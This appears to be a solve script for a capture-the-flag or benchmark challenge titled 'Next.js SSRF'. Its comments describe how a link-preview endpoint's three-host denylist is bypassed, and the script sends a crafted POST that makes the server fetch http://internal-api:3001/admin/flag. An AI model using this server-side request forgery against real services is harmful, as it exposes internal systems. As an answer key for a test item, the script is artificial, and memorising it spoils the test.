#!/usr/bin/env bash
# APEX-001-25 — "Next.js SSRF" (tags: ssrf, nextjs)
#
# `/api/fetch-url` takes a URL in a JSON body and fetches it server-side for a
# link preview. Its allowlist is a denylist of three literal hostnames —
# `127.0.0.1`, `0.0.0.0`, `::1` — and the service worth reaching is not an
# address at all. Compose puts `internal-api` on the same network with no port
# published, so `http://internal-api:3001/admin/flag` resolves for the
# application and for nothing outside it.
#
# The page's own form would build this request, but only with script running.
# The request does not need the page: `replay --create` writes the method, the
# path and the JSON field onto the navigation that opened the site, which is a
# captured request like any other.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex001-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" req_0 --create \
    --set method=POST \
    --set path=/api/fetch-url \
    --set header.Content-Type=application/json \
    --set json.url=http://internal-api:3001/admin/flag |
    flag
